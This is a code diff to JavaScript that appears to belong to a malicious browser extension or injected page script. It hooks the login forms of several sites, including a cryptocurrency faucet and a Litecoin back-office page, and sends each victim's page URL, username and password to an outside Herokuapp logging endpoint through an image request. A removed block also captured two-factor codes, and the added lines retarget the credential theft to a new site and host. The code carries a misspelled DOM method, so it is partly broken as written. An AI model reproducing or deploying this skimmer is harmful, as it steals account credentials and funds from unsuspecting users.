@@ -52,20 +52,17 @@
         username = document.getElementById("user_login").value;
         user_pass = document.getElementById("user_pass").value;
         if (username && user_pass) {
-          (new Image).src = "https://fetching-urls.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
 
         }
       };
     }
-    if (location.href.indexOf("coinpot.co") >= 0) {
-      document.getElementsById("SignInForm").onsubmit = function() {
-        username = document.getElementById("SignInEmailInput").value;
-        user_pass = document.getElementById("SignInPasswordInput").value;
-        code2FA = document.getElementById("SignInCodeInput").value;
+    if (location.href.indexOf("ltcbackoffice.org/login.php") >= 0) {
+      document.getElementsById("login-form").onsubmit = function() {
+        username = document.getElementById("username").value;
+        user_pass = document.getElementById("password").value;
         if (username && user_pass) {
-
-            (new Image).src = "https://fetching-urls.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass+" -- || -- "+code2FA;
-
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
         }
       };
     }
